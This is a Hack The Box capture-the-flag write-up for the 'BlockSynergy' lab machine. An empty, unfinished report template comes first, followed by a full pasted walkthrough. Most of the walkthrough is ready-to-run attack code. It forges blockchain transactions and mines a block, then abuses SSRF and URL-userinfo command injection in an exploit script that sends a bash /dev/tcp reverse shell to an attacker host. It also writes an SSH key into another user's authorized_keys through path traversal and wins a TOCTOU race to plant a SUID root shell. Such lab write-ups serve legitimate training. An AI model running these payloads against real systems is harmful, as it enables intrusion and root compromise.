---
link: https://app.hackthebox.com/machines/BlockSynergy
difficulty: Insane
os: Linux
release date: 2026-08-29
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a29813ab-2643-4f77-80fd-65500f97bcd0-1787750589.png
solved:
solve date:
machine no.: 13
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">BlockSynergy Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a29813ab-2643-4f77-80fd-65500f97bcd0-1787750589.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): R00cKet</p>
    <p style="margin: 0;">Difficulty: Insane</p>
    <p style="margin: 0;">Date: 29 Aug 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/BlockSynergy]
└─$ ping -c 4 10.129.115.174
PING 10.129.115.174 (10.129.115.174) 56(84) bytes of data.
64 bytes from 10.129.115.174: icmp_seq=1 ttl=63 time=201 ms
64 bytes from 10.129.115.174: icmp_seq=2 ttl=63 time=232 ms
64 bytes from 10.129.115.174: icmp_seq=3 ttl=63 time=262 ms
64 bytes from 10.129.115.174: icmp_seq=4 ttl=63 time=291 ms

--- 10.129.115.174 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 200.902/246.514/291.001/33.608 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.
- `| grapo`
	- **Description:** Custom shell function (defined in `~/.zshrc`) that echoes the full scan to the terminal via `tee /dev/tty`, then extracts open-port numbers and prints them as a comma-joined list.
	- **Purpose:** Produces a ready-to-copy port string (`22,80,1515`) to feed straight into the targeted deep scan, without hand-copying from the report.

**Result:**

```shell

```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell

```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port | **Service** | **Version** | **Analysis** | **Simple Explanation** |
| ---- | ----------- | ----------- | ------------ | ---------------------- |
|      |             |             |              |                        |
|      |             |             |              |                        |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References




## **Initial Foothold**

### 1. The Wallet & The Glitch

- **The App:** Port 8080 is a custom Python blockchain. Start by creating and loading a wallet.
- **The Glitch:** You need coins to unlock the VIP section. Look at the transaction broadcast endpoint. Forge a transaction to mint coins to your own public key.

### 2. Mining & The VIP Unlock

- **The Mine:** Your forged coins are stuck in the “pending” pool until they are mined into a block. Fetch the mining data and write a quick script to brute-force the `nonce`.
- **The Catch:** Read the block validation rules carefully. There is a strict numerical requirement for how many transactions _must_ be included in a single block.

### 3. SSRF & The Hidden Admin

- **The SSRF:** The VIP panel lets you register and “test” (ping) nodes. The app blocks `127.0.0.1` and `localhost`.

### 4. Command Injection via URL Smuggling

- **The Injection:** The admin panel pings the URLs you register. Look at how the backend constructs the shell command.
- **The Smuggle:** Study URL anatomy. What happens if you put shell separators in the `userinfo` section?
- **The Constraints:** The Python URL parser will reject your payload if you use spaces or forward slashes (`/`).


Attack chain at a glance

|   |   |   |   |
|---|---|---|---|
|#|Stage|Vulnerability|Result|
|1|Web enum|Custom Python blockchain app on :8080|API map|
|2|/dashboard/wallet|Unrestricted wallet create/load|Session wallet|
|3|/broadcast_transaction|No signature validation → forge coinbase tx|Unlimited coins|
|4|/submit_block|Weak PoW we can mine ourselves|Balance confirmed → VIP unlocked|
|5|VIP node register|SSRF blocklist misses 0.0.0.0|Reach localhost‑only /admin|
|6|/admin ping_node|shell=True + URL _userinfo_ smuggled into shell|RCE as walter → user.txt|
|7|Internal Flask :5000 (hank)|Debug‑hook log_file path traversal (write)|SSH key into hank|
|8|Restore daemon|TOCTOU: verify SHA256 → re‑open same path → tar -C / as root|SUID bash → root|

Everything below uses only the primitives proven in the notes/solver material you provided, cleaned up and de‑duplicated so each command is actually needed and correct.

---

## Phase 0 — Reconnaissance

sudo nmap -sC -sV -p- –min-rate 5000 <TARGET_IP> -oA full

PORT     STATE SERVICE

22/tcp   open  ssh

8080/tcp open  http-proxy

Only SSH and a web proxy. So the entire entry is through [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080.

---

## Phase 1 — Web Enumeration (what the app is)

Browsing to [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080 shows the BlockSynergy Dashboard (sidebar: _Dashboard Overview, Load/Create Wallet, Wallet Info, Blocks, Make Transaction, Transaction History, Pending Transactions_). The API page (first screenshot) leaks the machine’s entire attack surface:

|   |   |   |
|---|---|---|
|Name|Endpoint|Why we care|
|Blockchain|/blockchain|Dump the chain|
|Nodes|/nodes|JSON list of registered “nodes” (needed for indexing later)|
|Mining Data|/mining_data|Gives us pending_transactions, latest_block, difficulty → we can mine|
|Submit Block|/submit_block|Accepts attacker‑built blocks|
|Broadcast Transaction|/broadcast_transaction|Accepts any JSON — no signature check → money printer|

Key facts (from the app/source):

- It is a custom Python blockchain, not an EVM node.
- Block hash formula (this is the PoW we must satisfy):

block_hash = sha256( str(index) + previous_hash + timestamp + json.dumps(data) + str(nonce) ).hexdigest()

- A valid block must contain exactly 5 transactions.
- The VIP area (/dashboard/vip/nodes) unlocks once your wallet balance is ≥ 10 coins.

![](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/08/image-63.png?resize=601%2C1024&ssl=1)

---

## Phase 2 — Create & Load a Wallet

The wallet page (second screenshot) has two forms. The important gotcha: the upload field name is file (not wallet_file) — with the wrong name the session never binds a wallet.

# 1) Create a wallet (response body = the wallet JSON with both keys)

curl -s -c jar.txt -b jar.txt \

  -F action=create -F filename=wallet \

  [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080/dashboard/wallet -o wallet.json

cat wallet.json

# {“private_key”: “…”, “public_key”: “<PUBKEY>”}

# 2) Load it into our session (field name MUST be “file”)

curl -s -c jar.txt -b jar.txt \

  -F action=load -F “file=@wallet.json” \

  [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080/dashboard/wallet

Save the public key: PUBKEY=$(python3 -c “import json;print(json.load(open(‘wallet.json’))[‘public_key’])”)

![](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/08/image-64.png?resize=960%2C653&ssl=1)

---

## Phase 3 — Forge Coins (/broadcast_transaction has no validation)

The app trusts any transaction whose sender is Blockchain_Reward and whose signature is “Blockchain” (that’s how real coinbase rewards look). There is no cryptographic verification, so we simply mint money to ourselves:

curl -s -X POST [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080/broadcast_transaction \

  -H ‘Content-Type: application/json’ \

  -d “{\”sender\”:\”Blockchain_Reward\”,\”receiver\”:\”${PUBKEY}\”,\”amount\”:1000,\”signature\”:\”Blockchain\”,\”timestamp\”:\”now\”}”

# -> Added!

The tx now sits in the _pending pool_. It only counts toward our balance once it is included in a mined block — so we mine one ourselves.

---

## Phase 4 — Mine a Block (the PoW is trivially reusable)

/mining_data hands us everything: pending txs, the previous hash (latest_block is just the hash string), and difficulty (a string of zeros like “0000”). We build a block with exactly 5 txs (ours first) and brute‑force nonce.

mine.py

#!/usr/bin/env python3

import hashlib, json, time, sys

import requests

TARGET = “[http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080”          # <– edit

PUBKEY = “<PUBKEY>”                          # <– edit

s = requests.Session()

# make sure the pool has >= 5 of our txs (pad with extra mints if needed)

for i in range(5):

    tx = {“sender”: “Blockchain_Reward”, “receiver”: PUBKEY,

          “amount”: 1000 + i, “signature”: “Blockchain”,

          “timestamp”: str(time.time())}

    print(“[*] mint:”, s.post(f”{TARGET}/broadcast_transaction”, json=tx).text.strip())

d     = s.get(f”{TARGET}/mining_data”).json()

pending    = d[“pending_transactions”]

prev_hash  = d[“latest_block”]          # hash string of the latest block

difficulty = d[“difficulty”]            # e.g. “0000”

index      = len(d[“blockchain”]) + 1

our   = [t for t in pending if t.get(“receiver”) == PUBKEY]

rest  = [t for t in pending if t.get(“receiver”) != PUBKEY]

txs   = (our + rest)[:5]                # EXACTLY five transactions

assert len(txs) == 5

timestamp, nonce = str(time.time()), 0

print(f”[*] mining index={index} difficulty={difficulty} …”)

while True:

    blob = str(index) + prev_hash + timestamp + json.dumps(txs) + str(nonce)

    h = hashlib.sha256(blob.encode()).hexdigest()

    if h.startswith(difficulty):

        break

    nonce += 1

print(f”[+] nonce={nonce} hash={h}”)

block = {“index”: index, “previous_hash”: prev_hash, “timestamp”: timestamp,

         “data”: txs, “nonce”: nonce, “hash”: h}

r = s.post(f”{TARGET}/submit_block”, json={“block”: block, “address”: PUBKEY})

print(“[+] submit_block:”, r.text.strip())     # -> Added!

python3 mine.py

After this, /dashboard/info shows a big balance and /dashboard/vip/nodes returns 200 — VIP unlocked.

---

## Phase 5 — SSRF: the VIP node register misses 0.0.0.0

The VIP panel lets you _register_ node URLs; “testing” a node makes the server fetch it. A blocklist rejects 127.0.0.1/localhost — but 0.0.0.0 is allowed, and on Linux connecting to 0.0.0.0 connects to loopback. Manual proof:

# register the localhost-only admin panel as a “node”

curl -s -b jar.txt -c jar.txt \

  -d “action=register&node=http://0.0.0.0:8080/admin” \

  [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080/dashboard/vip/nodes

# find its index in the node list (JSON)

curl -s [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080/nodes

# e.g. [“[http://0.0.0.0:8080/admin”%5D&nbsp](http://0.0.0.0:8080/admin%E2%80%9D%5D&nbsp); -> index 0

# make the server fetch it for us (SSRF)

curl -s -b jar.txt [http://<TARGET_IP&gt](http://%3Ctarget_ip&gt/);:8080/dashboard/vip/nodes/test_node/0

# -> HTML of the INTERNAL /admin panel

---

## Phase 6 — Command Injection in ping_node (RCE as walter)

The admin ping_node handler builds ping -w 4 <something> with shell=True, and the “something” is derived from the userinfo part of the registered node URL. Python’s urlparse only validates the _hostname_:

[http://x;id;a@0.0.0.0:8080/](http://x%3Bid%3Ba@0.0.0.0:8080/)

        ^^^^^^^^  userinfo -> goes to the shell

                    ^^^^^^  hostname -> passes the blocklist

The shell sees ping -w 4 x;id;a@0.0.0.0:8080 → runs ping x, then id, then garbage.

Two payload constraints (memorize these):

1. No / in the command — a slash terminates the netloc, so hostname becomes garbage and registration fails.
2. No spaces — use ${IFS} (shell whitespace variable). For commands that inherently contain / (like a reverse shell), hex‑encode them and rebuild on target with xxd -r -p (the wrapper itself is slash/space‑free).

Trigger mechanics: register two nodes — (A) the malicious userinfo URL, and (B) a URL that is itself an SSRF into the admin panel: [http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<urlencoded](http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=%3Curlencoded) A>. Testing node B makes the server call the internal ping handler on node A → our command executes as walter.

exploit.py — automates wallet → VIP → RCE → reverse shell:

#!/usr/bin/env python3

“””BlockSynergy web chain: wallet -> VIP -> SSRF -> cmdinj -> shell (walter)”””

import html, json, re, sys, time, hashlib

import requests

from urllib.parse import quote

if len(sys.argv) != 4:

    sys.exit(f”usage: {sys.argv[0]} <target_ip> <lhost> <lport>”)

TARGET_IP, LHOST, LPORT = sys.argv[1], sys.argv[2], sys.argv[3]

BASE = f”[http://](http:){TARGET_IP}:8080″

s = requests.Session()

def log(m): print(f”[*] {m}”, flush=True)

# ———- 1. wallet ———-

r = s.post(f”{BASE}/dashboard/wallet”,

           files={“action”: (None, “create”), “filename”: (None, “pwn”)})

wallet = r.json()

log(f”wallet: {wallet[‘public_key’][:16]}…”)

s.post(f”{BASE}/dashboard/wallet”,

       files={“action”: (None, “load”),

              “file”: (“wallet.json”, json.dumps(wallet).encode(), “application/json”)})

PUB = wallet[“public_key”]

# ———- 2. mint + mine (VIP needs >= 10 coins) ———-

for i in range(5):

    s.post(f”{BASE}/broadcast_transaction”,

           json={“sender”: “Blockchain_Reward”, “receiver”: PUB,

                 “amount”: 1000 + i, “signature”: “Blockchain”,

                 “timestamp”: str(time.time())})

d = s.get(f”{BASE}/mining_data”).json()

pending, prev, diff = d[“pending_transactions”], d[“latest_block”], d[“difficulty”]

index = len(d[“blockchain”]) + 1

our  = [t for t in pending if t.get(“receiver”) == PUB]

txs  = (our + [t for t in pending if t.get(“receiver”) != PUB])[:5]

ts, nonce = str(time.time()), 0

while True:

    h = hashlib.sha256((str(index)+prev+ts+json.dumps(txs)+str(nonce)).encode()).hexdigest()

    if h.startswith(diff): break

    nonce += 1

log(s.post(f”{BASE}/submit_block”,

           json={“block”: {“index”: index, “previous_hash”: prev, “timestamp”: ts,

                           “data”: txs, “nonce”: nonce, “hash”: h},

                 “address”: PUB}).text.strip())

# ———- 3. VIP ———-

for _ in range(10):

    if s.get(f”{BASE}/dashboard/vip/nodes”).status_code == 200: break

    time.sleep(1)

else:

    sys.exit(“[-] VIP not unlocked”)

log(“VIP unlocked”)

# ———- 4. SSRF + command injection ———-

def hex_wrap(cmd):   # slash/space-free executor: hex -> xxd -> sh

    return f”echo${{IFS}}{cmd.encode().hex()}|xxd${{IFS}}-r${{IFS}}-p|sh”

def pay_url(cmd):    # userinfo smuggled into the ping shell; hostname stays 0.0.0.0

    return f”[http://x](http://x/);{cmd};a@0.0.0.0:8080/”

def fire(cmd):

    pay  = pay_url(cmd)

    trig = (“[http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=&#8221](http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=&#8221);

            + quote(pay, safe=””))

    for _ in range(20):                       # node list is flushed periodically -> retry

        s.post(f”{BASE}/dashboard/vip/nodes”, data={“action”: “register”, “node”: pay})

        s.post(f”{BASE}/dashboard/vip/nodes”, data={“action”: “register”, “node”: trig})

        try: nodes = s.get(f”{BASE}/nodes”).json()

        except Exception: time.sleep(0.3); continue

        if trig not in nodes: time.sleep(0.3); continue

        r = s.get(f”{BASE}/dashboard/vip/nodes/test_node/{nodes.index(trig)}”)

        return pay, r.text

    return pay, None

def get_out(body, anchor):

    if not body or body.find(anchor) < 0: return None

    m = re.search(r”<pre[^>]*>(.*?)</pre>”, body[body.find(anchor):], re.S)

    return html.unescape(m.group(1)).strip() if m else None

pay, body = fire(“id”)                        # proof of command execution

log(f”id => {get_out(body, pay)}”)

rev = f”setsid${{IFS}}bash${{IFS}}-c${{IFS}}’bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1’${{IFS}}&”

fire(hex_wrap(rev))                           # revshell contains ‘/’ -> hex-wrap it

log(“reverse shell fired – check your listener”)

nc -lvnp 4444                 # attacker box

python3 exploit.py <TARGET_IP> <ATTACKER_IP> 4444

Shell lands as walter:

python3 -c ‘import pty;pty.spawn(“/bin/bash”)’

cat /home/walter/user.txt     # <USER_FLAG>

---

## Phase 7 — Lateral movement: walter → hank (internal Flask on 127.0.0.1:5000)

Local enum as walter:

ss -tlnp

# 127.0.0.1:5000  ->  a second Flask app running as hank

curl -s [http://127.0.0.1:5000/](http://127.0.0.1:5000/)

That internal app is a _contract engine_. Its debug log hook writes log_content to __meta__.log_file with no path sanitization → arbitrary file write as hank via ../. We aim it at authorized_keys.

On Kali:

ssh-keygen -t ed25519 -f hank_key -N “”

cat hank_key.pub

On walter’s shell (paste your pubkey into PUB):

PUB=’ssh-ed25519 AAAA….you@kali’

cat > /tmp/contract.json <<EOF

{

  “logic”: {“claim”: “allow”},

  “debug”: “True”,

  “hooks”: {“on_claim”: “log”},

  “__meta__”: {

    “log_file”: “../../../../home/hank/.ssh/authorized_keys”,

    “log_content”: {“on_claim”: “\n${PUB}”}

  }

}

EOF

# upload the contract, then trigger the claim hook (appends our key)

curl -s -c /tmp/cj -b /tmp/cj -F “action=upload_contract” \

     -F “contract_file=@/tmp/contract.json;type=application/json” \

     [http://127.0.0.1:5000/dashboard](http://127.0.0.1:5000/dashboard)

curl -s -c /tmp/cj -b /tmp/cj -d “action=contract_claim” \

     [http://127.0.0.1:5000/dashboard](http://127.0.0.1:5000/dashboard)

Back on Kali:

ssh -i hank_key hank@<TARGET_IP>

---

## Phase 8 — Root: TOCTOU race against the restore daemon

### 8.1 Enumerate the weakness

id

# uid=…(hank) gid=…(hank) groups=…(hank),…(developers)

ls -ld /opt/blocksynergy /var/restore_work

# drwxrwxr-x hank developers /opt/blocksynergy     <- we can touch the trigger file

# drwxrwxr-x root developers /var/restore_work     <- we can write/replace inside

Run pspy64 (host it on Kali with python3 -m http.server 8000, then wget on target). Every 5 minutes root runs a backup job that reveals the FTP flow:

curl -T <ARCHIVE> ftp://ftpuser:<FTP_PASSWORD>@127.0.0.1:15432/upload/<ARCHIVE>

and a restore daemon (as root) that:

1. sees /opt/blocksynergy/restore appear (we can create it!),
2. downloads the trusted archive to /var/restore_work/_opt_blocksynergy.tar.gz,
3. verifies its SHA256,
4. re‑opens the same pathname and runs tar xvf … -C / as root.

That _verify‑then‑reopen_ is a classic TOCTOU: if we atomically swap the file after sha256sum closes it but before tar opens it, root extracts _our_ archive.

### 8.2 Malicious archive — a SUID root bash

tar –owner=0 –group=0 –mode=4755 \

    –transform=’s|^bash$|opt/blocksynergy/.diag|’ \

    -czf /tmp/restore_suid.tar.gz -C /bin bash

tar -tvzf /tmp/restore_suid.tar.gz

# -rwsr-xr-x root/root … opt/blocksynergy/.diag   <- verify BEFORE racing

(When root’s tar -C / extracts this, /opt/blocksynergy/.diag becomes a setuid‑root bash.)

### 8.3 The inotify racer

We watch for IN_CLOSE_NOWRITE (0x10) on the archive — that is sha256sum closing it after verification — then rename() our payload over it. rename() is atomic on the same filesystem; if /tmp is a separate mount on your target and you get EXDEV, just place the payload inside /var/restore_work/ instead.

race_watcher.py (run as hank):

#!/usr/bin/env python3

import os, sys, ctypes, struct

TARGET_DIR  = “/var/restore_work”

TARGET_FILE = “_opt_blocksynergy.tar.gz”

REPLACEMENT = “/tmp/restore_suid.tar.gz”      # same fs as TARGET_DIR for atomic rename

TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)

libc = ctypes.CDLL(“libc.so.6”, use_errno=True)

IN_CLOSE_NOWRITE = 0x00000010                 # “read-only fd closed” = sha256sum done

EVENT_SIZE = struct.calcsize(“iIII”)

fd = libc.inotify_init()

if fd < 0 or libc.inotify_add_watch(fd, TARGET_DIR.encode(), IN_CLOSE_NOWRITE) < 0:

    sys.exit(“[-] inotify setup failed”)

print(f”[*] watching {TARGET_DIR} …”, flush=True)

while True:

    buf = os.read(fd, 4096)

    off = 0

    while off < len(buf):

        wd, mask, cookie, nlen = struct.unpack_from(“iIII”, buf, off)

        off += EVENT_SIZE

        name = buf[off:off+nlen].rstrip(b”\x00″).decode()

        off += nlen

        if name == TARGET_FILE and os.path.exists(REPLACEMENT):

            os.rename(REPLACEMENT, TARGET_PATH)   # atomic swap in the TOCTOU window

            print(“[+] swapped! root’s tar will now extract OUR archive.”, flush=True)

            sys.exit(0)

### 8.4 Fire the race and get root

python3 race_watcher.py &     # 1) arm the watcher

touch /opt/blocksynergy/restore   # 2) tell the restore daemon to start (it consumes the file)

# wait for “[+] swapped!” (may take until the next 5-min backup cycle)

ls -l /opt/blocksynergy/.diag

# -rwsr-xr-x 1 root root … /opt/blocksynergy/.diag

/opt/blocksynergy/.diag -p    # -p => bash keeps effective UID 0

id

# uid=1002(hank) gid=1002(hank) euid=0(root) …

cat /root/root.txt

# <ROOT_FLAG>